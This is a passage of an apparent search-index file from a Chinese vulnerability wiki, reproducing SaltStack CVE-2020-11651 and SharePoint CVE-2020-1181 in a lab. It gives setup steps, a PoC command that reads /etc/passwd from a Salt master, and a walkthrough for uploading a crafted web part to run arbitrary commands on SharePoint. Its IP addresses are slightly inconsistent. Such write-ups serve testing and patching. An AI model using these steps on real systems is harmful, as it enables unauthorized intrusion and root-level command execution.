\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\u4e2d\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u53ef\u4ee5\u7ed5\u8fc7 Salt Master \u7684\u9a8c\u8bc1\u903b\u8f91\uff0c\u8c03\u7528\u76f8\u5173\u672a\u6388\u6743\u51fd\u6570\u529f\u80fd\uff0c\u4ece\u800c\u53ef\u4ee5\u9020\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff1a ClearFuncs\u7c7b\u4f1a\u5904\u7406\u975e\u8ba4\u8bc1\u7684\u8bf7\u6c42\u548c\u66b4\u9732_send_pub()\u65b9\u6cd5\uff0c\u53ef\u4ee5\u7528\u6765\u76f4\u63a5\u5728master publish\u670d\u52a1\u5668\u4e0a\u5bf9\u6d88\u606f\u8fdb\u884c\u6392\u961f\u3002\u8fd9\u4e9b\u6d88\u606f\u53ef\u4ee5\u7528\u6765\u89e6\u53d1minion\u6765\u4ee5root\u6743\u9650\u8fd0\u884c\u4efb\u610f\u547d\u4ee4\u3002 ClearFuncs\u7c7b\u8fd8\u4f1a\u66b4\u9732 _prep_auth_info()\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u4f1a\u8fd4\u56de\u7528\u6765\u8ba4\u8bc1master\u670d\u52a1\u5668\u4e0a\u672c\u5730root\u7528\u6237\u7684\u547d\u4ee4\u7684root key\u3002\u7136\u540eroot key\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u8c03\u7528master \u670d\u52a1\u5668\u7684\u7ba1\u7406\u547d\u4ee4\u3002\u8fd9\u79cd\u65e0\u610f\u7684\u66b4\u9732\u63d0\u4f9b\u7ed9\u8fdc\u7a0b\u975e\u8ba4\u8bc1\u7684\u653b\u51fb\u8005\u5bf9salt master\u7684\u4e0eroot\u6743\u9650\u7b49\u4ef7\u7684\u8bbf\u95ee\u6743\u9650\u3002 0x03 \u5f71\u54cd\u7248\u672c \u00b6 \uf06c SaltStack < 2019.2.4 \uf06c SaltStack < 3000.2 0x04 \u73af\u5883\u642d\u5efa \u00b6 \u76f4\u63a5\u4f7f\u7528vulhub\u8fdb\u884c\u642d\u5efa git clone https://github.com/vulhub/vulhub.git cd /vulhub/saltstack/CVE-2020-11651/ docker-compose up -d \u67e5\u770b\u73af\u5883\u662f\u5426\u542f\u52a8docker ps 0x05 \u6f0f\u6d1e\u590d\u73b0 \u00b6 Poc\uff1a https://github.com/jasperla/CVE-2020-11651-poc \u6267\u884c\u524d\u9700\u8981\u5b89\u88c5salt\u5e93\uff0c\u9700\u6307\u5b9asalt\u5e93\u7248\u672c pip3 install salt==2019.2.3 \u9776\u673aip\uff1a192.168.10.113 \u653b\u51fb\u673aip\uff1a192.168.10.113 \u8bfb\u53d6\u6587\u4ef6\uff1a python3 exploit.py --master 192.168.232.170 -r /etc/passwd 0x06 \u4fee\u590d\u65b9\u5f0f 1\u3001SaltStack\u5b98\u65b9\u5df2\u53d1\u5e03\u6700\u65b0\u7248\u672c\u4fee\u590d\u6b64\u6f0f\u6d1e\uff0c\u5efa\u8bae\u76f8\u5173\u7528\u6237\u53ca\u65f6\u66f4\u65b0\u81f3\u5b89\u5168\u7248\u672c\u53ca\u5176\u4ee5\u4e0a\uff0c\u5e76\u5f00\u542fSaltStack\u81ea\u52a8\u66f4\u65b0\uff0c\u4ee5\u4fbf\u5b9e\u65f6\u83b7\u53d6\u8865\u4e01\u6216\u5347\u7ea7\u81f3\u5b89\u5168\u7248\u672c\uff1a https://repo.saltstack.com/ 2\u3001\u7981\u6b62\u5c06Salt Master\u9ed8\u8ba4\u76d1\u542c\u7aef\u53e3\uff084505\u30014506\uff09\u5411\u516c\u7f51\u5f00\u653e\uff0c\u5e76\u8bbe\u7f6e\u4e3a\u4ec5\u5bf9\u53ef\u4fe1\u5bf9\u8c61\u5f00\u653e\u3002","title":"SaltStack\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e CVE 2020 11651"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/#0x01","text":"SaltStack \u662f\u57fa\u4e8e Python \u5f00\u53d1\u7684\u4e00\u5957C/S\u67b6\u6784\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\u3002","title":"0x01 \u7b80\u4ecb"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/#0x02","text":"\u5728 CVE-2020-11651 \u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\u4e2d\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u53ef\u4ee5\u7ed5\u8fc7 Salt Master \u7684\u9a8c\u8bc1\u903b\u8f91\uff0c\u8c03\u7528\u76f8\u5173\u672a\u6388\u6743\u51fd\u6570\u529f\u80fd\uff0c\u4ece\u800c\u53ef\u4ee5\u9020\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff1a ClearFuncs\u7c7b\u4f1a\u5904\u7406\u975e\u8ba4\u8bc1\u7684\u8bf7\u6c42\u548c\u66b4\u9732_send_pub()\u65b9\u6cd5\uff0c\u53ef\u4ee5\u7528\u6765\u76f4\u63a5\u5728master publish\u670d\u52a1\u5668\u4e0a\u5bf9\u6d88\u606f\u8fdb\u884c\u6392\u961f\u3002\u8fd9\u4e9b\u6d88\u606f\u53ef\u4ee5\u7528\u6765\u89e6\u53d1minion\u6765\u4ee5root\u6743\u9650\u8fd0\u884c\u4efb\u610f\u547d\u4ee4\u3002 ClearFuncs\u7c7b\u8fd8\u4f1a\u66b4\u9732 _prep_auth_info()\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u4f1a\u8fd4\u56de\u7528\u6765\u8ba4\u8bc1master\u670d\u52a1\u5668\u4e0a\u672c\u5730root\u7528\u6237\u7684\u547d\u4ee4\u7684root key\u3002\u7136\u540eroot key\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u8c03\u7528master \u670d\u52a1\u5668\u7684\u7ba1\u7406\u547d\u4ee4\u3002\u8fd9\u79cd\u65e0\u610f\u7684\u66b4\u9732\u63d0\u4f9b\u7ed9\u8fdc\u7a0b\u975e\u8ba4\u8bc1\u7684\u653b\u51fb\u8005\u5bf9salt master\u7684\u4e0eroot\u6743\u9650\u7b49\u4ef7\u7684\u8bbf\u95ee\u6743\u9650\u3002","title":"0x02 \u6f0f\u6d1e\u6982\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/#0x03","text":"\uf06c SaltStack < 2019.2.4 \uf06c SaltStack < 3000.2","title":"0x03 \u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/#0x04","text":"\u76f4\u63a5\u4f7f\u7528vulhub\u8fdb\u884c\u642d\u5efa git clone https://github.com/vulhub/vulhub.git cd /vulhub/saltstack/CVE-2020-11651/ docker-compose up -d \u67e5\u770b\u73af\u5883\u662f\u5426\u542f\u52a8docker ps","title":"0x04 \u73af\u5883\u642d\u5efa"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/#0x05","text":"Poc\uff1a https://github.com/jasperla/CVE-2020-11651-poc \u6267\u884c\u524d\u9700\u8981\u5b89\u88c5salt\u5e93\uff0c\u9700\u6307\u5b9asalt\u5e93\u7248\u672c pip3 install salt==2019.2.3 \u9776\u673aip\uff1a192.168.10.113 \u653b\u51fb\u673aip\uff1a192.168.10.113 \u8bfb\u53d6\u6587\u4ef6\uff1a python3 exploit.py --master 192.168.232.170 -r /etc/passwd 0x06 \u4fee\u590d\u65b9\u5f0f 1\u3001SaltStack\u5b98\u65b9\u5df2\u53d1\u5e03\u6700\u65b0\u7248\u672c\u4fee\u590d\u6b64\u6f0f\u6d1e\uff0c\u5efa\u8bae\u76f8\u5173\u7528\u6237\u53ca\u65f6\u66f4\u65b0\u81f3\u5b89\u5168\u7248\u672c\u53ca\u5176\u4ee5\u4e0a\uff0c\u5e76\u5f00\u542fSaltStack\u81ea\u52a8\u66f4\u65b0\uff0c\u4ee5\u4fbf\u5b9e\u65f6\u83b7\u53d6\u8865\u4e01\u6216\u5347\u7ea7\u81f3\u5b89\u5168\u7248\u672c\uff1a https://repo.saltstack.com/ 2\u3001\u7981\u6b62\u5c06Salt Master\u9ed8\u8ba4\u76d1\u542c\u7aef\u53e3\uff084505\u30014506\uff09\u5411\u516c\u7f51\u5f00\u653e\uff0c\u5e76\u8bbe\u7f6e\u4e3a\u4ec5\u5bf9\u53ef\u4fe1\u5bf9\u8c61\u5f00\u653e\u3002","title":"0x05 \u6f0f\u6d1e\u590d\u73b0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SharePoint/CVE-2020-1181%20SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"CVE-2020-1181 SharePoint\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-19 15:39:29 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5fae\u8f6fSharePoint\u670d\u52a1\u5668\u5141\u8bb8\u7528\u6237\u521b\u5efaweb\u9875\u9762\uff0c\u4f46\u4e3a\u4e86\u907f\u514d\u88ab\u6ee5\u7528\uff0c\u670d\u52a1\u5668\u4f1a\u4e25\u683c\u9650\u5236\u8fd9\u4e9b\u9875\u9762\u4e0a\u80fd\u591f\u51fa\u73b0\u7684\u7ec4\u4ef6\u3002SharePoint\u670d\u52a1\u5668\u4f1a\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u6765\u5904\u7406\u201c\u81ea\u6709\u201d\u9875\u9762\u548c\u7528\u6237\u5b9a\u4e49\u7684\u9875\u9762\u3002SharePoint\u7684\u201c\u81ea\u6709\u201d\u9875\u9762\u5b58\u653e\u5728\u6587\u4ef6\u7cfb\u7edf\u4e0a\uff0c\u4e0d\u53d7\u4efb\u4f55\u9650\u5236\u3002\u7528\u6237\u9875\u9762\u5b58\u653e\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u53d7\u670d\u52a1\u5668\u7ea6\u675f\u3002\u5176\u4e2d\u6709\u4e9b\u9650\u5236\u6761\u4ef6\u5305\u62ec\u65e0\u6cd5\u4f7f\u7528\u4ee3\u7801\u5757\uff08code block\uff09\u3001\u65e0\u6cd5\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u3002\u7528\u6237\u9875\u9762\u901a\u5e38\u53ea\u80fd\u4f7f\u7528\u9884\u5b9a\u4e49\u5217\u8868\u4e2d\u5141\u8bb8\u7684web\u63a7\u4ef6\u3002 \u5982\u679c\u7528\u6237\u901a\u8fc7\u4e0a\u4f20\u65b9\u5f0f\u521b\u5efa\u65b0\u9875\u9762\uff0c\u90a3\u4e48\u8be5\u9875\u9762\u4e5f\u4f1a\u53d7\u5230\u9650\u5236\u3002\u7136\u800c\uff0c\u5982\u679c\u65b0\u9875\u9762\u901a\u8fc7SharePoint Web Editor\u521b\u5efa\uff0c\u90a3\u4e48\u5c31\u4f1a\u88ab\u5f53\u6210\u201cghost\u201d\u9875\u9762\uff0c\u540c\u6837\u662f\u53ef\u4fe1\u7684\u6e90\u3002\u8fd9\u4e2a\u903b\u8f91\u4e5f\u5f88\u6b63\u5e38\uff0c\u56e0\u4e3aSharePoint Web Editor\u4f1a\u9650\u5236\u80fd\u591f\u6dfb\u52a0\u5230\u9875\u9762\u7684\u5177\u4f53\u7ec4\u4ef6\uff0c\u56e0\u6b64\u9875\u9762\u53ef\u4ee5\u5728\u4e0d\u53d7\u9650\u5236\u7684\u6a21\u5f0f\u4e0b\u5b89\u5168\u8fd0\u884c\u3002 Web Editor\u4e2d\u5141\u8bb8\u4e00\u79cdWeb Part\u7c7b\u578b\uff1aWikiContentWebpart\u3002\u8fd9\u79cdWeb Part\u5141\u8bb8\u5305\u542b\u4efb\u610fASP.NET\u6807\u8bb0\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5728\u4e0d\u53d7\u9650\u6a21\u5f0f\u4e0b\u8fd0\u884c\u4efb\u610fASP.NET\u6807\u8bb0\uff0c\u6700\u7ec8\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002 POC \u00b6 \u6f14\u793a\u573a\u666f\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u7248\u672c\u4e3a\u9ed8\u8ba4\u914d\u7f6e\u7684Microsoft SharePoint 2019 Server\uff0c\u5b89\u88c5\u5728Windows Server 2019 Datacenter\u7cfb\u7edf\u4e0a\u3002\u670d\u52a1\u5668\u4e3b\u673a\u540d\u4e3asp2019.contoso.lab\uff0c\u5df2\u52a0\u5165contoso.lab\u57df\u4e2d\uff0c\u57df\u63a7\u5236\u5668\u4e3a\u4e00\u53f0\u72ec\u7acb\u7684\u865a\u62df\u673a\u3002\u6211\u4eec\u7684\u76ee\u6807\u4e3b\u673a\u5df2\u5b89\u88c5\u622a\u81f32020\u5e742\u6708\u4efd\u7684\u6240\u6709\u8865\u4e01\uff0c\u56e0\u6b64\u5bf9\u5e94\u7684\u7248\u672c\u53f7\u4e3a16.0.10355.20000\u3002 \u653b\u51fb\u7cfb\u7edf\u4e2d\u53ea\u9700\u8981\u4f7f\u7528\u652f\u6301\u7684web\u6d4f\u89c8\u5668\u5373\u53ef\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u6d4f\u89c8\u5668\u4e3aMozilla Firefox 69.0.3\u3002\u6211\u4eec\u8fd8\u4f1a\u4f7f\u7528\u4e0e\u524d\u6587\u7c7b\u4f3c\u7684WikiContentWebpart\uff0c\u5c06\u5176\u547d\u540d\u4e3aWikiContentRCE.xml\u3002 \u9996\u5148\u6211\u4eec\u8bbf\u95eeSharePoint Server\uff0c\u4ee5\u666e\u901a\u7528\u6237\uff08user2\uff09\u901a\u8fc7\u8eab\u4efd\u8ba4\u8bc1\uff1a \u63a5\u4e0b\u6765\u521b\u5efa\u7ad9\u70b9\uff0c\u4f7f\u8be5\u7528\u6237\u53d8\u6210\u8be5\u7ad9\u70b9\u6240\u6709\u8005\uff08owner\uff09\uff0c\u5177\u5907\u6240\u6709\u6743\u9650\u3002 \u70b9\u51fb\u9876\u90e8\u9762\u677f\u7684\u201cSharePoint\u201d\u533a\u57df\uff1a \u7136\u540e\u70b9\u51fb\u201c+ Create site\u201d\u94fe\u63a5\uff1a \u9009\u62e9\u201cTeam Site\u201d\u3002\u73b0\u5728\u6211\u4eec\u9700\u8981\u4e3a\u65b0\u7ad9\u70b9\u8bbe\u7f6e\u540d\u79f0\uff0c\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u4e3atestsiteofuser2\u3002 \u70b9\u51fb\u201cFinish\u201d\uff0c\u6210\u529f\u521b\u5efa\u65b0\u7ad9\u70b9\uff1a \u73b0\u5728\u70b9\u51fb\u201cPages\u201d\u94fe\u63a5\uff1a \u6211\u4eec\u9700\u8981\u5207\u6362\u5230\u201cClassic View\u201d\uff0c\u70b9\u51fb\u5de6\u4e0b\u89d2\u7684\u201cReturn to classic SharePoint\u201d\u94fe\u63a5\u5373\u53ef\uff1a \u70b9\u51fb\u201c+ New\u201d\uff0c\u4e3a\u65b0\u9875\u9762\u8bbe\u7f6e\u4e00\u4e2a\u540d\u79f0\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u4e3anewpage1\uff1a \u70b9\u51fb\u201cCreate\u201d\u6309\u94ae\u786e\u8ba4 \u73b0\u5728\u6211\u4eec\u9700\u8981\u5728\u201cINSERT\u201d\u6807\u7b7e\u9875\u4e2d\u9009\u62e9\u201cWeb Part\u201d\uff1a \u5728\u5bf9\u8bdd\u6846\u7a97\u53e3\u4e2d\uff0c\u9009\u62e9\u5de6\u4e0b\u89d2\u7684\u201cUpload Web Part\u201d\u94fe\u63a5\uff0c\u4e0a\u4f20\u6211\u4eec\u6784\u9020\u7684WikiContentRCE.xml\u6587\u4ef6\uff1a \u70b9\u51fbUpload\u3002\u6211\u4eec\u53ef\u80fd\u4f1a\u770b\u5230\u4e00\u4e2a\u8b66\u544a\u5f39\u7a97\uff1a\u201c\u786e\u8ba4\u79bb\u5f00\u9875\u9762\uff1f\u60a8\u8f93\u5165\u7684\u6570\u636e\u53ef\u80fd\u4e0d\u4f1a\u88ab\u4fdd\u5b58\u201d\u3002\u6b64\u65f6\u70b9\u51fb\u201cLeave Page\u201d\u6309\u94ae\u5373\u53ef\uff0c\u8fd4\u56de\u4e3b\u7f16\u8f91\u89c6\u56fe\uff1a \u6211\u4eec\u9700\u8981\u518d\u6b21\u5728INSERT\u6807\u7b7e\u9875\u4e2d\u9009\u62e9Web Part\u5c0f\u90e8\u4ef6\uff0c\u5176\u4e2d\u5c06\u51fa\u73b0\u6211\u4eec\u5bfc\u5165\u7684Web Part\uff1a \u5728\u70b9\u51fbAdd\u6309\u94ae\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u8f6c\u5230\u76ee\u6807SharePoint\u670d\u52a1\u5668\uff0c\u6253\u5f00C:\\windows\\temp\u76ee\u5f55\uff1a \u6b64\u65f6\u8be5\u76ee\u5f55\u4e2d\u4e0d\u5b58\u5728RCE_PoC.txt\u6587\u4ef6\u3002 \u73b0\u5728\u6211\u4eec\u8f6c\u5230\u653b\u51fb\u8005\u4e3b\u673a\uff0c\u5c06\u6211\u4eec\u5bfc\u5165\u7684Web Part\u6dfb\u52a0\u5230\u9875\u9762\u4e2d\uff1a \u518d\u6b21\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u68c0\u67e5C:\\windows\\temp\u76ee\u5f55\uff1a \u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\uff0c\u5165\u4fb5\u670d\u52a1\u5668\u3002\u653b\u51fb\u8005\u53ea\u9700\u8981\u5728WikiContentRCE.xml\u6587\u4ef6\u4e2d\uff0c\u5c06echo pwned > c:/windows/temp/RCE_PoC.txt\u5b57\u7b26\u4e32\u66ff\u6362\u6210\u6240\u9700\u7684\u547d\u4ee4\u5373\u53ef\u3002","title":"CVE-2020-1181 SharePoint\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SharePoint/CVE-2020-1181%20SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#cve-2020-1181-sharepoint","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-19 15:39:29","title":"CVE-2020-1181 SharePoint\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SharePoint/CVE-2020-1181%20SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"\u5fae\u8f6fSharePoint\u670d\u52a1\u5668\u5141\u8bb8\u7528\u6237\u521b\u5efaweb\u9875\u9762\uff0c\u4f46\u4e3a\u4e86\u907f\u514d\u88ab\u6ee5\u7528\uff0c\u670d\u52a1\u5668\u4f1a\u4e25\u683c\u9650\u5236\u8fd9\u4e9b\u9875\u9762\u4e0a\u80fd\u591f\u51fa\u73b0\u7684\u7ec4\u4ef6\u3002SharePoint\u670d\u52a1\u5668\u4f1a\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u6765\u5904\u7406\u201c\u81ea\u6709\u201d\u9875\u9762\u548c\u7528\u6237\u5b9a\u4e49\u7684\u9875\u9762\u3002SharePoint\u7684\u201c\u81ea\u6709\u201d\u9875\u9762\u5b58\u653e\u5728\u6587\u4ef6\u7cfb\u7edf\u4e0a\uff0c\u4e0d\u53d7\u4efb\u4f55\u9650\u5236\u3002\u7528\u6237\u9875\u9762\u5b58\u653e\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u53d7\u670d\u52a1\u5668\u7ea6\u675f\u3002\u5176\u4e2d\u6709\u4e9b\u9650\u5236\u6761\u4ef6\u5305\u62ec\u65e0\u6cd5\u4f7f\u7528\u4ee3\u7801\u5757\uff08code block\uff09\u3001\u65e0\u6cd5\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u3002\u7528\u6237\u9875\u9762\u901a\u5e38\u53ea\u80fd\u4f7f\u7528\u9884\u5b9a\u4e49\u5217\u8868\u4e2d\u5141\u8bb8\u7684web\u63a7\u4ef6\u3002 \u5982\u679c\u7528\u6237\u901a\u8fc7\u4e0a\u4f20\u65b9\u5f0f\u521b\u5efa\u65b0\u9875\u9762\uff0c\u90a3\u4e48\u8be5\u9875\u9762\u4e5f\u4f1a\u53d7\u5230\u9650\u5236\u3002\u7136\u800c\uff0c\u5982\u679c\u65b0\u9875\u9762\u901a\u8fc7SharePoint Web Editor\u521b\u5efa\uff0c\u90a3\u4e48\u5c31\u4f1a\u88ab\u5f53\u6210\u201cghost\u201d\u9875\u9762\uff0c\u540c\u6837\u662f\u53ef\u4fe1\u7684\u6e90\u3002\u8fd9\u4e2a\u903b\u8f91\u4e5f\u5f88\u6b63\u5e38\uff0c\u56e0\u4e3aSharePoint Web Editor\u4f1a\u9650\u5236\u80fd\u591f\u6dfb\u52a0\u5230\u9875\u9762\u7684\u5177\u4f53\u7ec4\u4ef6\uff0c\u56e0\u6b64\u9875\u9762\u53ef\u4ee5\u5728\u4e0d\u53d7\u9650\u5236\u7684\u6a21\u5f0f\u4e0b\u5b89\u5168\u8fd0\u884c\u3002 Web Editor\u4e2d\u5141\u8bb8\u4e00\u79cdWeb Part\u7c7b\u578b\uff1aWikiContentWebpart\u3002\u8fd9\u79cdWeb Part\u5141\u8bb8\u5305\u542b\u4efb\u610fASP.NET\u6807\u8bb0\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5728\u4e0d\u53d7\u9650\u6a21\u5f0f\u4e0b\u8fd0\u884c\u4efb\u610fASP.NET\u6807\u8bb0\uff0c\u6700\u7ec8\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SharePoint/CVE-2020-1181%20SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"\u6f14\u793a\u573a\u666f\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u7248\u672c\u4e3a\u9ed8\u8ba4\u914d\u7f6e\u7684Microsoft SharePoint 2019 Server\uff0c\u5b89\u88c5\u5728Windows Server 2019 Datacenter\u7cfb\u7edf\u4e0a\u3002\u670d\u52a1\u5668\u4e3b\u673a\u540d\u4e3asp2019.contoso.lab\uff0c\u5df2\u52a0\u5165contoso.lab\u57df\u4e2d\uff0c\u57df\u63a7\u5236\u5668\u4e3a\u4e00\u53f0\u72ec\u7acb\u7684\u865a\u62df\u673a\u3002\u6211\u4eec\u7684\u76ee\u6807\u4e3b\u673a\u5df2\u5b89\u88c5\u622a\u81f32020\u5e742\u6708\u4efd\u7684\u6240\u6709\u8865\u4e01\uff0c\u56e0\u6b64\u5bf9\u5e94\u7684\u7248\u672c\u53f7\u4e3a16.0.10355.20000\u3002 \u653b\u51fb\u7cfb\u7edf\u4e2d\u53ea\u9700\u8981\u4f7f\u7528\u652f\u6301\u7684web\u6d4f\u89c8\u5668\u5373\u53ef\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u6d4f\u89c8\u5668\u4e3aMozilla Firefox 69.0.3\u3002\u6211\u4eec\u8fd8\u4f1a\u4f7f\u7528\u4e0e\u524d\u6587\u7c7b\u4f3c\u7684WikiContentWebpart\uff0c\u5c06\u5176\u547d\u540d\u4e3aWikiContentRCE.xml\u3002 \u9996\u5148\u6211\u4eec\u8bbf\u95eeSharePoint Server\uff0c\u4ee5\u666e\u901a\u7528\u6237\uff08user2\uff09\u901a\u8fc7\u8eab\u4efd\u8ba4\u8bc1\uff1a \u63a5\u4e0b\u6765\u521b\u5efa\u7ad9\u70b9\uff0c\u4f7f\u8be5\u7528\u6237\u53d8\u6210\u8be5\u7ad9\u70b9\u6240\u6709\u8005\uff08owner\uff09\uff0c\u5177\u5907\u6240\u6709\u6743\u9650\u3002 \u70b9\u51fb\u9876\u90e8\u9762\u677f\u7684\u201cSharePoint\u201d\u533a\u57df\uff1a \u7136\u540e\u70b9\u51fb\u201c+ Create site\u201d\u94fe\u63a5\uff1a \u9009\u62e9\u201cTeam Site\u201d\u3002\u73b0\u5728\u6211\u4eec\u9700\u8981\u4e3a\u65b0\u7ad9\u70b9\u8bbe\u7f6e\u540d\u79f0\uff0c\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u4e3atestsiteofuser2\u3002 \u70b9\u51fb\u201cFinish\u201d\uff0c\u6210\u529f\u521b\u5efa\u65b0\u7ad9\u70b9\uff1a \u73b0\u5728\u70b9\u51fb\u201cPages\u201d\u94fe\u63a5\uff1a \u6211\u4eec\u9700\u8981\u5207\u6362\u5230\u201cClassic View\u201d\uff0c\u70b9\u51fb\u5de6\u4e0b\u89d2\u7684\u201cReturn to classic SharePoint\u201d\u94fe\u63a5\u5373\u53ef\uff1a \u70b9\u51fb\u201c+ New\u201d\uff0c\u4e3a\u65b0\u9875\u9762\u8bbe\u7f6e\u4e00\u4e2a\u540d\u79f0\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u4e3anewpage1\uff1a \u70b9\u51fb\u201cCreate\u201d\u6309\u94ae\u786e\u8ba4 \u73b0\u5728\u6211\u4eec\u9700\u8981\u5728\u201cINSERT\u201d\u6807\u7b7e\u9875\u4e2d\u9009\u62e9\u201cWeb Part\u201d\uff1a \u5728\u5bf9\u8bdd\u6846\u7a97\u53e3\u4e2d\uff0c\u9009\u62e9\u5de6\u4e0b\u89d2\u7684\u201cUpload Web Part\u201d\u94fe\u63a5\uff0c\u4e0a\u4f20\u6211\u4eec\u6784\u9020\u7684WikiContentRCE.xml\u6587\u4ef6\uff1a \u70b9\u51fbUpload\u3002\u6211\u4eec\u53ef\u80fd\u4f1a\u770b\u5230\u4e00\u4e2a\u8b66\u544a\u5f39\u7a97\uff1a\u201c\u786e\u8ba4\u79bb\u5f00\u9875\u9762\uff1f\u60a8\u8f93\u5165\u7684\u6570\u636e\u53ef\u80fd\u4e0d\u4f1a\u88ab\u4fdd\u5b58\u201d\u3002\u6b64\u65f6\u70b9\u51fb\u201cLeave Page\u201d\u6309\u94ae\u5373\u53ef\uff0c\u8fd4\u56de\u4e3b\u7f16\u8f91\u89c6\u56fe\uff1a \u6211\u4eec\u9700\u8981\u518d\u6b21\u5728INSERT\u6807\u7b7e\u9875\u4e2d\u9009\u62e9Web Part\u5c0f\u90e8\u4ef6\uff0c\u5176\u4e2d\u5c06\u51fa\u73b0\u6211\u4eec\u5bfc\u5165\u7684Web Part\uff1a \u5728\u70b9\u51fbAdd\u6309\u94ae\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u8f6c\u5230\u76ee\u6807SharePoint\u670d\u52a1\u5668\uff0c\u6253\u5f00C:\\windows\\temp\u76ee\u5f55\uff1a \u6b64\u65f6\u8be5\u76ee\u5f55\u4e2d\u4e0d\u5b58\u5728RCE_PoC.txt\u6587\u4ef6\u3002 \u73b0\u5728\u6211\u4eec\u8f6c\u5230\u653b\u51fb\u8005\u4e3b\u673a\uff0c\u5c06\u6211\u4eec\u5bfc\u5165\u7684Web Part\u6dfb\u52a0\u5230\u9875\u9762\u4e2d\uff1a \u518d\u6b21\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u68c0\u67e5C:\\windows\\temp\u76ee\u5f55\uff1a 